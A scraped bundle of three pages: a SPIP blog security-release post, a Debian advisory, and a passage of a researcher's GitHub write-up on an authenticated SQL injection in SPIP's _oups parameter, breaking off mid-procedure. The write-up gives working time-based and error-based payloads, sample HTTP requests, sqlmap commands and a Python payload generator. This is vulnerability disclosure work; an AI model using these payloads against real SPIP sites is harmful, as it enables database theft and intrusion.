=== Content from blog.spip.net_2e8f7060_20250115_102940.html ===

**[![](local/cache-vignettes/L96xH96/siteon0-47b07.png?1666949430)SPIP Blog](https://blog.spip.net/ "Accueil")**

Du logiciel libre et de la tendresse

* [Gazette](-Gazette-.html)
* [Release](-Release-.html)
* [Développement](-Developpement-.html)
* [Communauté](-Communaute-.html)
* [Ailleurs](-Ailleurs-.html)

[Accueil](https://blog.spip.net/) > [Release](-Release-.html) > **Mise à jour de sécurité : sortie de SPIP 4.1.7, SPIP 4.0.9 et SPIP 3.2.17**

# Mise à jour de sécurité : sortie de SPIP 4.1.7, SPIP 4.0.9 et SPIP 3.2.17

lundi 16 janvier 2023, par [La team](_La-team_.html)

Suite au signalement de plusieurs failles critiques de sécurité, nous publions les version 4.1.7, 4.0.9 et 3.2.17. Un grand merci à Abyss Watcher et à un retraité de la communauté SPIP pour ces signalements.

Ces versions corrigent deux failles de sécurité dont une pouvait permettre une injection SQL depuis l’espace d’administration et une autre exploitant le formulaire de rappel de mot de passe depuis l’espace public. Elles corrigent aussi un bug dans la gestion du cache des contextes Ajax, et rétablissent le fonctionnement du bouton qui permet de cocher toutes les mises à jour depuis la page de gestion des plugins dans SPIP 4.

Le détail des changements apportés à la branche 4.1 est disponible dans [le ficher CHANGELOG](https://git.spip.net/spip/spip/src/branch/4.1/CHANGELOG.md).

Comme la dernière fois, si vous vous demandez pourquoi on est passé de la 4.1.5 à la 4.1.7, c’est tout simplement parce qu’on a découvert et corrigé un bug dans la sauvegarde de la base de données avec MySQL juste avant la release ^^

## Mettre à jour en utilisant le spip\_loader

Vous pouvez aussi mettre à jour au moyen de la dernière version du spip\_loader (**version 5.2.1**)

**–** Le spip\_loader est maintenant distribué à l’adresse suivante

<https://get.spip.net/>

**–** Le spip\_loader.php est maintenant au format binaire [phar](https://www.php.net/manual/fr/intro.phar.php). Si vous avez besoin de personnaliser l’installation en définissant des constantes, il vous faut créer un fichier de configuration spip\_loader\_config.php (cf <https://www.spip.net/fr_article5705.html>).

## Résumé des versions de SPIP

| Branche | Version | Suivi | Compatibilité PHP |
| --- | --- | --- | --- |

| SPIP 4.1 | [SPIP 4.1.7](https://files.spip.net/spip/archives/spip-v4.1.7.zip) | Branche stable | PHP 7.4 à PHP 8.1 |
| --- | --- | --- | --- |
| SPIP 4.0 | [SPIP 4.0.9](https://files.spip.net/spip/archives/spip-v4.0.9.zip) | Branche stable | PHP 7.3 à PHP 8.0 |
| SPIP 3.2 | [SPIP 3.2.17](https://files.spip.net/spip/archives/spip-v3.2.17.zip) | Branche stable | PHP 5.4 à PHP 7.4 |

Les versions **SPIP 3.1 et antérieures** ne sont plus maintenues.

Pour connaître le détail des versions maintenues :

<https://www.spip.net/fr_article6500.html>

## Comment être tenu au courant de ces annonces ?

C’est simple, inscrivez-vous sur la mailing liste <https://discuter.spip.net/c/spip-ann/13>

Bien sûr, les réseaux sociaux sont de la partie :

* Seenthis : <https://seenthis.net/people/spip>
* Mamot : [https://mamot.fr/@spip](https://mamot.fr/%40spip)
* Facebook : <https://www.facebook.com/spip.net>
## Une question, besoin d’aide ?

En cas de problème ou de difficultés, il y aura certainement quelqu’un pour vous aider sur IRC, N’hésitez pas à venir poser vos questions <https://irc.spip.net>

Vous pouvez aussi poster un message et échanger sur :

* La liste des utilisateurs et utilisatrices <https://discuter.spip.net/c/spip/6>
* La liste du développement spip-dev [https://discuter.spip.net/c/spip-dev/5](https://discuter.spip.net/c/spip-dev/5%C2%A0)

Nous vous rappelons que pour signaler une faille, il suffit d’envoyer un mail à spip-team@rezo.net.

## Messages

* [16 janvier 2023, 14:57, par hérisson](#forum6262 "Lien permanent vers le commentaire 6262")

  Merci la team & la communauté et ses fringuants rétraités
* [16 janvier 2023, 17:13, par Gabriel](#forum6263 "Lien permanent vers le commentaire 6263")

  Merci pour la màj. 👍
* [17 février 2023, 09:31, par Antoine](#forum6269 "Lien permanent vers le commentaire 6269")

  Bonjour, pourriez-vous indiquer les références des CVE corrigées via cette mise à jour.

  Car je n’ai trouvé des références que pour la CVE-2020-28984 : <https://nvd.nist.gov/vuln/detail/CVE-2020-28984>

  Merci et bravo pour le travail apporté
## Un message, un commentaire ?

Qui êtes-vous ?
Votre nom

[Se connecter](spip.php?page=login&url=Mise-a-jour-de-securite-sortie-de-SPIP-4-1-7-SPIP-4-0-9-et-SPIP-3-2-17.html%3Flang%3Dfr)

Votre adresse email

Votre message

Texte de votre message (obligatoire)

Ce formulaire accepte les raccourcis SPIP `[->url] {{gras}} {italique} <quote> <code>` et le code HTML `<q> <del> <ins>`. Pour créer des paragraphes, laissez simplement des lignes vides.

Veuillez laisser ce champ vide :

Veuillez laisser ce champ vide :

Rechercher :

## Dans la même rubrique

* [Mise à jour de maintenance : sortie de SPIP 4.3.5](Mise-a-jour-de-maintenance-sortie-de-SPIP-4-3-5.html)
* [Mise à jour de maintenance : sortie de SPIP 4.3.4](Mise-a-jour-de-maintenance-sortie-de-SPIP-4-3-4.html)
* [Mise à jour de maintenance : sortie de SPIP 4.3.3](Mise-a-jour-de-maintenance-sortie-de-SPIP-4-3-3.html)
* [Mise à jour critique de sécurité : sortie de SPIP 4.3.2, SPIP 4.2.16, SPIP 4.1.18](Mise-a-jour-critique-de-securite-sortie-de-SPIP-4-3-2-SPIP-4-2-16-SPIP-4-1-18.html)
* [Mise à jour de maintenance : sortie de SPIP 4.3.1](Mise-a-jour-de-maintenance-sortie-de-SPIP-4-3-1.html)
* [Sortie de SPIP 4.3.0](Sortie-de-SPIP-4-3-0.html)
* [Mise à jour de maintenance et sécurité :  sortie de SPIP 4.2.15](Mise-a-jour-de-maintenance-et-securite-sortie-de-SPIP-4-2-15.html)
* [Sortie de SPIP 4.3.0-beta](Sortie-de-SPIP-4-3-0-beta.html)
* [Mise à jour de maintenance : sortie de SPIP 4.2.14, SPIP 4.1.17](Mise-a-jour-de-maintenance-sortie-de-SPIP-4-2-14-SPIP-4-1-17.html)
* [Mise à jour critique de sécurité : sortie de SPIP 4.3.0-alpha2, SPIP 4.2.13, SPIP 4.1.16](Mise-a-jour-critique-de-securite-sortie-de-SPIP-4-3-0-alpha2-SPIP-4-2-13-SPIP-4.html)

2005 - 2025 SPIP Blog

[![SPIP](spip.png)](https://www.spip.net/ "Site réalisé avec SPIP")



=== Content from www.debian.org_b33d87b9_20250115_102944.html ===


---

[[Date Prev](msg00013.html)][[Date Next](msg00015.html)]
[[Thread Prev](msg00013.html)][[Thread Next](msg00015.html)]
[[Date Index](maillist.html#00014)]
[[Thread Index](threads.html#00014)]

# [SECURITY] [DSA 5325-1] spip security update

---

* *To*: debian-security-announce@lists.debian.org
* *Subject*: [SECURITY] [DSA 5325-1] spip security update
* *From*: Sebastien Delafond <seb@debian.org>
* *Date*: Tue, 24 Jan 2023 10:17:45 +0000
* *Message-id*: <[[🔎]](/msgid-search/E1pKGN7-008PLA-Rg%40seger.debian.org) [E1pKGN7-008PLA-Rg@seger.debian.org](msg00014.html)>
* *Reply-to*: debian-security-announce-request@lists.debian.org

---

```
-----BEGIN PGP SIGNED MESSAGE-----
Hash: SHA512

- -------------------------------------------------------------------------
Debian Security Advisory DSA-5325-1                   security@debian.org
<https://www.debian.org/security/>                       Sebastien Delafond
January 24, 2023                      <https://www.debian.org/security/faq>
- -------------------------------------------------------------------------

Package        : spip

It was discovered that SPIP, a website engine for publishing, would
allow a malicious user to SQL injection attacks, or bypass
authorization access.

For the stable distribution (bullseye), this problem has been fixed in
version 3.2.11-3+deb11u6.

We recommend that you upgrade your spip packages.

For the detailed security status of spip please refer to
its security tracker page at:
<https://security-tracker.debian.org/tracker/spip>

Further information about Debian Security Advisories, how to apply
these updates to your system and frequently asked questions can be
found at: <https://www.debian.org/security/>

Mailing list: debian-security-announce@lists.debian.org
-----BEGIN PGP SIGNATURE-----

iQEzBAEBCgAdFiEEAqSkbVtrXP4xJMh3EL6Jg/PVnWQFAmPPpdYACgkQEL6Jg/PV
nWT7GQgAgemz9C/cvulSLwEuV38WAaZwy8RFC3CGw3DirFLf2tVeC6KDI+tGs/u4
XSY7M45xEr4y1TR3NMfovrnX6iR/JgPU/3ZJsFquq8O5Z9WCeZFe2YCkmuqP9hQv
txXfOoL4c9b1hfgtv4nVcqLyCFFJhfqLiAy8Eb18vzuggjLVYKa1kioa8wAGk/YB
B9rvoKNN1bBfow7A7704Gk2bJMfcxIC9P4anHm6u0OZ4HgC0GYpVYZXegfrFICs7
fylqgcg6Ub+HH+6e3wEDN1oqnj0IQDy09lFj4kCT5xQjhQM8oMZChExndWdmRRI2
iEmUN/gg7RVhdUfNvv8VTy1lo+wd4g==
=XA3L
-----END PGP SIGNATURE-----

```

---



=== Content from github.com_68ce2d9a_20250115_102943.html ===

[Skip to content](#start-of-content)

## Navigation Menu

Toggle navigation

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2FAbyss-W4tcher%2Fab4yss-wr4iteups%2Fblob%2Fffa980faa9e3598d49d6fb7def4f7a67cfb5f427%2FSPIP%2520-%2520Pentest%2FSPIP%25204.1.5%2FSPIP_4.1.5_AND_BEFORE_AUTH_SQLi_Abyss_Watcher.md)

* Product

  + [GitHub Copilot
    Write better code with AI](https://github.com/features/copilot)
  + [Security
    Find and fix vulnerabilities](https://github.com/features/security)
  + [Actions
    Automate any workflow](https://github.com/features/actions)
  + [Codespaces
    Instant dev environments](https://github.com/features/codespaces)
  + [Issues
    Plan and track work](https://github.com/features/issues)
  + [Code Review
    Manage code changes](https://github.com/features/code-review)
  + [Discussions
    Collaborate outside of code](https://github.com/features/discussions)
  + [Code Search
    Find more, search less](https://github.com/features/code-search)

  Explore
  + [All features](https://github.com/features)
  + [Documentation](https://docs.github.com)
  + [GitHub Skills](https://skills.github.com)
  + [Blog](https://github.blog)
* Solutions

  By company size
  + [Enterprises](https://github.com/enterprise)
  + [Small and medium teams](https://github.com/team)
  + [Startups](https://github.com/enterprise/startups)
  By use case
  + [DevSecOps](/solutions/use-case/devsecops)
  + [DevOps](/solutions/use-case/devops)
  + [CI/CD](/solutions/use-case/ci-cd)
  + [View all use cases](/solutions/use-case)

  By industry
  + [Healthcare](/solutions/industry/healthcare)
  + [Financial services](/solutions/industry/financial-services)
  + [Manufacturing](/solutions/industry/manufacturing)
  + [Government](/solutions/industry/government)
  + [View all industries](/solutions/industry)

  [View all solutions](/solutions)
* Resources

  Topics
  + [AI](/resources/articles/ai)
  + [DevOps](/resources/articles/devops)
  + [Security](/resources/articles/security)
  + [Software Development](/resources/articles/software-development)
  + [View all](/resources/articles)

  Explore
  + [Learning Pathways](https://resources.github.com/learn/pathways)
  + [White papers, Ebooks, Webinars](https://resources.github.com)
  + [Customer Stories](https://github.com/customer-stories)
  + [Partners](https://partner.github.com)
  + [Executive Insights](https://github.com/solutions/executive-insights)
* Open Source

  + [GitHub Sponsors
    Fund open source developers](/sponsors)
  + [The ReadME Project
    GitHub community articles](https://github.com/readme)
  Repositories
  + [Topics](https://github.com/topics)
  + [Trending](https://github.com/trending)
  + [Collections](https://github.com/collections)
* Enterprise

  + [Enterprise platform
    AI-powered developer platform](/enterprise)
  Available add-ons
  + [Advanced Security
    Enterprise-grade security features](https://github.com/enterprise/advanced-security)
  + [GitHub Copilot
    Enterprise-grade AI features](/features/copilot#enterprise)
  + [Premium Support
    Enterprise-grade 24/7 support](/premium-support)
* [Pricing](https://github.com/pricing)

Search or jump to...

# Search code, repositories, users, issues, pull requests...

Search

Clear

[Search syntax tips](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax)

# Provide feedback

We read every piece of feedback, and take your input very seriously.

Include my email address so I can be contacted

  Cancel

 Submit feedback

# Saved searches

## Use saved searches to filter your results more quickly

Name

Query

To see all available qualifiers, see our [documentation](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax).

  Cancel

 Create saved search

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2FAbyss-W4tcher%2Fab4yss-wr4iteups%2Fblob%2Fffa980faa9e3598d49d6fb7def4f7a67cfb5f427%2FSPIP%2520-%2520Pentest%2FSPIP%25204.1.5%2FSPIP_4.1.5_AND_BEFORE_AUTH_SQLi_Abyss_Watcher.md)

[Sign up](/signup?ref_cta=Sign+up&ref_loc=header+logged+out&ref_page=%2F%3Cuser-name%3E%2F%3Crepo-name%3E%2Fblob%2Fshow&source=header-repo&source_repo=Abyss-W4tcher%2Fab4yss-wr4iteups)
Reseting focus

You signed in with another tab or window. Reload to refresh your session.
You signed out in another tab or window. Reload to refresh your session.
You switched accounts on another tab or window. Reload to refresh your session.

Dismiss alert

{{ message }}

[Abyss-W4tcher](/Abyss-W4tcher)
/
**[ab4yss-wr4iteups](/Abyss-W4tcher/ab4yss-wr4iteups)**
Public

* [Notifications](/login?return_to=%2FAbyss-W4tcher%2Fab4yss-wr4iteups) You must be signed in to change notification settings
* [Fork
  2](/login?return_to=%2FAbyss-W4tcher%2Fab4yss-wr4iteups)
* [Star
   2](/login?return_to=%2FAbyss-W4tcher%2Fab4yss-wr4iteups)

* [Code](/Abyss-W4tcher/ab4yss-wr4iteups)
* [Issues
  0](/Abyss-W4tcher/ab4yss-wr4iteups/issues)
* [Pull requests
  0](/Abyss-W4tcher/ab4yss-wr4iteups/pulls)
* [Actions](/Abyss-W4tcher/ab4yss-wr4iteups/actions)
* [Projects
  0](/Abyss-W4tcher/ab4yss-wr4iteups/projects)
* [Security](/Abyss-W4tcher/ab4yss-wr4iteups/security)
* [Insights](/Abyss-W4tcher/ab4yss-wr4iteups/pulse)

Additional navigation options

* [Code](/Abyss-W4tcher/ab4yss-wr4iteups)
* [Issues](/Abyss-W4tcher/ab4yss-wr4iteups/issues)
* [Pull requests](/Abyss-W4tcher/ab4yss-wr4iteups/pulls)
* [Actions](/Abyss-W4tcher/ab4yss-wr4iteups/actions)
* [Projects](/Abyss-W4tcher/ab4yss-wr4iteups/projects)
* [Security](/Abyss-W4tcher/ab4yss-wr4iteups/security)
* [Insights](/Abyss-W4tcher/ab4yss-wr4iteups/pulse)

## Files

 ffa980f
## Breadcrumbs

1. [ab4yss-wr4iteups](/Abyss-W4tcher/ab4yss-wr4iteups/tree/ffa980faa9e3598d49d6fb7def4f7a67cfb5f427)
2. /[SPIP - Pentest](/Abyss-W4tcher/ab4yss-wr4iteups/tree/ffa980faa9e3598d49d6fb7def4f7a67cfb5f427/SPIP%20-%20Pentest)
3. /[SPIP 4.1.5](/Abyss-W4tcher/ab4yss-wr4iteups/tree/ffa980faa9e3598d49d6fb7def4f7a67cfb5f427/SPIP%20-%20Pentest/SPIP%204.1.5)
/
# SPIP\_4.1.5\_AND\_BEFORE\_AUTH\_SQLi\_Abyss\_Watcher.md

Copy path Blame  Blame
## Latest commit

## History

[History](/Abyss-W4tcher/ab4yss-wr4iteups/commits/ffa980faa9e3598d49d6fb7def4f7a67cfb5f427/SPIP%20-%20Pentest/SPIP%204.1.5/SPIP_4.1.5_AND_BEFORE_AUTH_SQLi_Abyss_Watcher.md)executable file·315 lines (198 loc) · 15.6 KB ffa980f
## Breadcrumbs

1. [ab4yss-wr4iteups](/Abyss-W4tcher/ab4yss-wr4iteups/tree/ffa980faa9e3598d49d6fb7def4f7a67cfb5f427)
2. /[SPIP - Pentest](/Abyss-W4tcher/ab4yss-wr4iteups/tree/ffa980faa9e3598d49d6fb7def4f7a67cfb5f427/SPIP%20-%20Pentest)
3. /[SPIP 4.1.5](/Abyss-W4tcher/ab4yss-wr4iteups/tree/ffa980faa9e3598d49d6fb7def4f7a67cfb5f427/SPIP%20-%20Pentest/SPIP%204.1.5)
/
# SPIP\_4.1.5\_AND\_BEFORE\_AUTH\_SQLi\_Abyss\_Watcher.md

Top
## File metadata and controls

* Preview
* Code
* Blame

executable file·315 lines (198 loc) · 15.6 KB[Raw](https://github.com/Abyss-W4tcher/ab4yss-wr4iteups/raw/ffa980faa9e3598d49d6fb7def4f7a67cfb5f427/SPIP%20-%20Pentest/SPIP%204.1.5/SPIP_4.1.5_AND_BEFORE_AUTH_SQLi_Abyss_Watcher.md)
# SQLi in \_oups POST parameter

### Author : Abyss Watcher

## Disclaimer

All the researches achieved here were done in a local environment. I am not responsible for any malicious use.

## Introduction

On July 17th 2022, the SPIP team released two consecutive commits, fixing an RCE vulnerability (more informations [here](https://github.com/Abyss-W4tcher/ab4yss-wr4iteups/blob/master/SPIP%204.1.2%20Vulnerabilities/SPIP_4.1.2_AUTH_RCE/SPIP_4.1.2_AUTH_RCE_Abyss_Watcher_12_07_22.md#post-auth-rce)):

[![picture 9](/Abyss-W4tcher/ab4yss-wr4iteups/raw/ffa980faa9e3598d49d6fb7def4f7a67cfb5f427/SPIP%20-%20Pentest/SPIP%204.1.5/images/9f6ddc9cdca6fcb55e16e5a1a751f99e1c5a70c8fa19d5d68d47bd19b9489358.png)](/Abyss-W4tcher/ab4yss-wr4iteups/blob/ffa980faa9e3598d49d6fb7def4f7a67cfb5f427/SPIP%20-%20Pentest/SPIP%204.1.5/images/9f6ddc9cdca6fcb55e16e5a1a751f99e1c5a70c8fa19d5d68d47bd19b9489358.png)

The first one, which replaced `(unserialize(base64_decode($oups))` with `(unserialize(base64_decode($oups), true)` was quickly overwritten. They chose to use `json_decode` instead of `unserialize` in the second commit. The code was a bit cleaner, and the RCE was successfully patched.

After the release of SPIP 4.1.5 (announcement [here](https://blog.spip.net/Mise-a-jour-critique-de-securite-sortie-de-SPIP-4-1-5-SPIP-4-0-8-et-SPIP-3-2-16.html)), we decided to build it and see if everything was correctly patched.

However, when we expected to see a base64 encoded JSON object for "\_oups", we still got a PHP serialized object. By directly inspecting the PHP code, and looking at the "4.1.5" branch in the SPIP core GitHub, we found this :

<https://github.com/spip/SPIP/blob/v4.1.5/prive/formulaires/editer_liens.php#L137>

[![picture 11](/Abyss-W4tcher/ab4yss-wr4iteups/raw/ffa980faa9e3598d49d6fb7def4f7a67cfb5f427/SPIP%20-%20Pentest/SPIP%204.1.5/images/c0c24185d6d3ad737cce42dae67286fb9c16ca5df4a9e7cbcc1b8e642ce1f618.png)](/Abyss-W4tcher/ab4yss-wr4iteups/blob/ffa980faa9e3598d49d6fb7def4f7a67cfb5f427/SPIP%20-%20Pentest/SPIP%204.1.5/images/c0c24185d6d3ad737cce42dae67286fb9c16ca5df4a9e7cbcc1b8e642ce1f618.png)

Even is the master branch has the "json\_decode" commit applied, the 4.1.5, 4.0.8 and 3.2.16 released [here](https://blog.spip.net/Mise-a-jour-critique-de-securite-sortie-de-SPIP-4-1-5-SPIP-4-0-8-et-SPIP-3-2-16.html) still contains the "unserialize version" from the first commit specified earlier.

This is not a big deal, as both commits patched the RCE with a function to drop the request if "\_oups" is not base64 valid.

Well, "\_oups" has already been used two times to achieve RCE in the past. However, thanks to the security fixes, everything should be fine now (or not ?).

---

Local setup : SPIP docker setup from <https://github.com/Abyss-W4tcher/ab4yss-wr4iteups>

Privileges : "editor" or equivalent

Provided payload are valid for both "4.1.5" and earlier as well as the master branch.

---

## "dev" master branch, "json\_decode" version

## TIME BASED SQLi

"Ooops" is a button that allows a user to cancel an action (the deletion of an article author here).

`_oups` POST parameter sent when clicking the "Ooops" button (base64 decoded) :

```
[
    {
        "id_auteur":"1",
        "id_objet":"1",
        "objet":"article",
        "vu":"0",
        "auteur":"1",
        "article":"1"
    }
]
```

This will restore the author as the article author.

After further investigations, it is possible to inject an SQLi payload, with this reduced JSON dictionnary :

```
{
    "objet":"article",
    "auteur":"1",
    "article":"1",
    "{{SQLi}}":""
}
```

Here is the generated error in `tmp/log/mysql.log` after sending the previous payload :

```
[DATETIME] [IP] [PID] :Pri:ERREUR: Erreur 1064 de mysql: You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '{{SQLi}}=''
WHERE id_auteur=1
	AND objet='article'
	AND id_objet=1' at line 2
in /var/www/html/ecrire/action/editer_liens.php L930 [sql_updateq(),lien_set(),objet_traiter_liaisons(),objet_qualifier_liens(),objet_associer(),formulaires_editer_liens_traiter_dist(),traiter_formulaires_dynamiques()]
UPDATE `spip`.spip_auteurs_liens
SET {{SQLi}}=''
WHERE id_auteur=1
	AND objet='article'
	AND id_objet=1
```

SPIP correctly filters the values of JSON keys, but it seems here that every key is processed as a column and put inside the SQL query (without filtering).

The `WHERE` part is actually important, and depends on the three keys "objet", "auteur" and "article". If one is missing, the `WHERE` becomes `WHERE 0=1` and prevents the SQLi to work correctly.

To build a valid query, we can send this payload, as "{{SQLi}}" key ;

`vu='' OR if((substr(user(),1,1) != 1), sleep(5), sleep(5)) #`

The query becomes :

```
UPDATE `spip`.spip_auteurs_liens
SET vu='' OR if((substr(user(),1,1) != 1), sleep(5), sleep(5)) #=''
WHERE id_auteur=1
	AND objet='article'
	AND id_objet=1
```

No possibility to stack queries with ";".

We now have a valid time based SQLi injection, which can be used to exfiltrate data.

To reproduce :

* GET "/ecrire/?exec=article&id\_article={{id\_article}}&\_oups=W3sib2JqZXQiOiJhcnRpY2xlIiwiYXV0ZXVyIjoiMSIsImFydGljbGUiOiIxIiwie3tTUUxJfX0iOiIifV0%3D"
* Prepare to intercept the next request (burp recommended)
* Click the "Ooops" button
* Intercept the request, send it to "repeater", or copy its content, then drop it
* Remove the `_oups` GET parameter from relative URL path
* You can now replace the `_oups` POST parameter with your base64 encoded JSON object

Be aware that, cookies and other POST parameters (CSRF tokens like) are needed to validate the request.
You may need to make this process every time you want to execute this payload, after a disconnect or a certain period of time, to get new valid tokens.

SAMPLE :

```
POST /ecrire/?exec=article&id_article=1 HTTP/1.1
Host: {{IP}}:{{PORT}}
Content-Length: {{Content-Length}}
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
Cookie: {{SPIP_COOKIES}}
Connection: close

var_ajax=form&exec=article&id_article=1&formulaire_action=editer_liens&formulaire_action_args={{formulaire_action_args}}&formulaire_action_sign={{formulaire_action_sign}}&visible=0&debutautl=&annuler_oups=Ooops&_oups=W3sib2JqZXQiOiJhcnRpY2xlIiwiYXV0ZXVyIjoiMSIsImFydGljbGUiOiIxIiwidnU9JycgT1IgaWYoKHN1YnN0cih1c2VyKCksMSwxKSAhPSAxKSwgc2xlZXAoNSksIHNsZWVwKDUpKSAjIjoiIn1d
```
> \_oups=[{"objet":"article","auteur":"1","article":"1","vu='' OR if((substr(user(),1,1) != 1), sleep(5), sleep(5)) #":""}]

The response will have a five seconds delay, which validates the injection.

**SQLMAP** :

SAMPLE :

```
POST /ecrire/?exec=article&id_article=1 HTTP/1.1
Host: {{IP}}:{{PORT}}
Content-Length: {{Content-Length}}
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
Cookie: {{SPIP_COOKIES}}
Connection: close

var_ajax=form&exec=article&id_article=1&formulaire_action=editer_liens&formulaire_action_args={{formulaire_action_args}}&formulaire_action_sign={{formulaire_action_sign}}&visible=0&debutautl=&annuler_oups=Ooops&_oups=[{"objet":"article","auteur":"1","article":"1","vu='' *":""}]
```

Then :

* Copy the previous request into a file (e.g. "r.txt")
* `sqlmap -r r.txt --dbms MYSQL --eval "from base64 import b64encode; _oups = b64encode(_oups.encode())" -p '_oups' --level 2`

If everything worked correctly, sqlmap should have found the "RLIKE time-based blind" injection.
You can now exploit (e.g. `sqlmap -r r.txt --dbms MYSQL --eval "from base64 import b64encode; _oups = b64encode(_oups.encode())" -p '_oups' --privileges`).

**Ressources :**

<https://osandamalith.com/2017/03/13/mysql-blind-injection-in-insert-and-update-statements/>

---

## ERROR BASED SQLi

With the ability to read the logs, via an LFI for example, we can get better exfiltration results than a time based SQLi :

`vu='' OR updatexml(1,concat(0x7e,(version())),0) #`

With this payload, we'll retrieve the result in mysql logs ("tmp/log/mysql.log"): `XPATH syntax error: '~5.7.39'`

---

## "4.1.5" and before, "unserialize" version

The idea is the same as explained before, except that we are injecting inside a PHP Object. We need to script the generation part, because the length of the SQLi payload must be correctly indicated.

Here is the content of a normal "\_oups" object (base64 decoded) :

`a:1:{i:0;a:6:{s:9:"id_auteur";s:1:"1";s:8:"id_objet";s:1:"1";s:5:"objet";s:7:"article";s:2:"vu";s:3:"non";s:6:"auteur";s:1:"1";s:7:"article";s:1:"1";}}`

We can see that it's the same content as the one used with "json\_decode". We can reduce it to :

`a:1:{i:0;a:4:{s:5:"objet";s:7:"article";s:6:"auteur";s:1:"1";s:7:"article";s:1:"1";s:8:"`**{{SQLi}}**`";s:0:""}}`

To generate our base64 encoded SQLi, we can use this small python script :

```
from base64 import b64encode
from urllib.parse import quote

sqli_payload = "vu='' OR updatexml(1,concat(0x7e,(version())),0) #"
php_object = f'a:1:{{i:0;a:4:{{s:5:"objet";s:7:"article";s:6:"auteur";s:1:"1";s:7:"article";s:1:"1";s:{len(sqli_payload)}:"{sqli_payload}";s:0:"";}}}}'

print(php_object)
print(quote(b64encode(php_object.encode()).decode()))
```

Output :

```
a:1:{i:0;a:4:{s:5:"objet";s:7:"article";s:6:"auteur";s:1:"1";s:7:"article";s:1:"1";s:50:"vu='' OR updatexml(1,concat(0x7e,(version())),0) #";s:0:"";}}
YToxOntpOjA7YTo0OntzOjU6Im9iamV0IjtzOjc6ImFydGljbGUiO3M6NjoiYXV0ZXVyIjtzOjE6IjEiO3M6NzoiYXJ0aWNsZSI7czoxOiIxIjtzOjUwOiJ2dT0nJyBPUiB1cGRhdGV4bWwoMSxjb25jYXQoMHg3ZSwodmVyc2lvbigpKSksMCkgIyI7czowOiIiO319
```

**SQLMAP** :

To make it work, we would have to create a custom tamper script, that takes the generated SQLi payload, calculates its size and place it in the object (same way as the python script). We would then need to base64 encode the object and return it to SQLMAP.

---

# Classic SQLi (any version)

As we have seen before, it is possible to send a time based payload in one shot to exfiltrate data. However, time based payloads generates a lot of traffic, and are quite slow.

To boost the efficiency, we came up with a procedure. We will be in a 4.1.5 version, which is exploitable with the "unserialize" version of the SQLi (it also works with "json\_decode").

First of, here is the content of the "spip.spip\_auteurs\_liens" table :

[![picture 3](/Abyss-W4tcher/ab4yss-wr4iteups/raw/ffa980faa9e3598d49d6fb7def4f7a67cfb5f427/SPIP%20-%20Pentest/SPIP%204.1.5/images/8dde95f85b609b5d875ccdd7a880cf4b3cc43d23f4a060c5e330e210aafecfff.png)](/Abyss-W4tcher/ab4yss-wr4iteups/blob/ffa980faa9e3598d49d6fb7def4f7a67cfb5f427/SPIP%20-%20Pentest/SPIP%204.1.5/images/8dde95f85b609b5d875ccdd7a880cf4b3cc43d23f4a060c5e330e210aafecfff.png)

* Launch "burpsuite", and use the integrated proxy browser (or find an equivalent setup)
* Create an article :

[![picture 1](/Abyss-W4tcher/ab4yss-wr4iteups/raw/ffa980faa9e3598d49d6fb7def4f7a67cfb5f427/SPIP%20-%20Pentest/SPIP%204.1.5/images/1042b376e0ce812357a4080cbc7ac851f57131fe3484db19058d7fafacbb6d29.png)](/Abyss-W4tcher/ab4yss-wr4iteups/blob/ffa980faa9e3598d49d6fb7def4f7a67cfb5f427/SPIP%20-%20Pentest/SPIP%204.1.5/images/1042b376e0ce812357a4080cbc7ac851f57131fe3484db19058d7fafacbb6d29.png)

* Toggle the "Intercept" button in the burp "Proxy" tab
* Click "Add an author"

[![picture 2](/Abyss-W4tcher/ab4yss-wr4iteups/raw/ffa980faa9e3598d49d6fb7def4f7a67cfb5f427/SPIP%20-%20Pentest/SPIP%204.1.5/images/c729bb77315dd8b6adf9af9070d3dad0a93db803615a343baf2f7f20c1e9745f.png)](/Abyss-W4tcher/ab4yss-wr4iteups/blob/ffa980faa9e3598d49d6fb7def4f7a67cfb5f427/SPIP%20-%20Pentest/SPIP%204.1.5/images/c729bb77315dd8b6adf9af9070d3dad0a93db803615a343baf2f7f20c1e9745f.png)

* Choose any author, here the only one available is "webmaster". Click "Add this author"
* Intercept the request, send it to "Repeater", then forward it
* You should find `ajouter_lien%5Bauteur-`**1**`-article-`**2**`%5D=%2B` at the bottom of the POST body

> This actually indicates us the article id, and the id of "webmaster"

* "webmaster" is now affiliated to this article :

[![picture 4](/Abyss-W4tcher/ab4yss-wr4iteups/raw/ffa980faa9e3598d49d6fb7def4f7a67cfb5f427/SPIP%20-%20Pentest/SPIP%204.1.5/images/23b3d3e3b7a5d5db558cb0b0e969f806940211cbd5153173beca0dc085913b0e.png)](/Abyss-W4tcher/ab4yss-wr4iteups/blob/ffa980faa9e3598d49d6fb7def4f7a67cfb5f427/SPIP%20-%20Pentest/SPIP%204.1.5/images/23b3d3e3b7a5d5db558cb0b0e969f806940211cbd5153173beca0dc085913b0e.png)

* Let's now send a POST request with malicious "\_oups" parameter, as seen previously. Be sure to correctly change the "article" and "auteur" value with the one indicated in `ajouter_lien` (payload is base64 decoded for demonstration) :

`a:1:{i:0;a:4:{s:5:"objet";s:7:"article";s:6:"auteur";s:1:"`**1**`";s:7:"article";s:1:"`**2**`";s:53:"vu=(SELECT nom FROM spip_auteurs WHERE id_auteur=1) #";s:0:"";}}`

* What we are doing here, is assigning the `vu` column the result of an arbitrary query. Here is the content of table "spip.spip\_auteurs\_liens" now :

[![picture 5](/Abyss-W4tcher/ab4yss-wr4iteups/raw/ffa980faa9e3598d49d6fb7def4f7a67cfb5f427/SPIP%20-%20Pentest/SPIP%204.1.5/images/c744d6199535b245cbef4830222d5cd5e8ecfc7fd5ec920a1c91198d6eb1bc0b.png)](/Abyss-W4tcher/ab4yss-wr4iteups/blob/ffa980faa9e3598d49d6fb7def4f7a67cfb5f427/SPIP%20-%20Pentest/SPIP%204.1.5/images/c744d6199535b245cbef4830222d5cd5e8ecfc7fd5ec920a1c91198d6eb1bc0b.png)

* The injection worked, but the field is limited to six characters. We will see that it's not really an issue later.
* Now, here is where the magic occurs. We will remove the "webmaster" user from the authors associated with our article (click on "Remove author"):

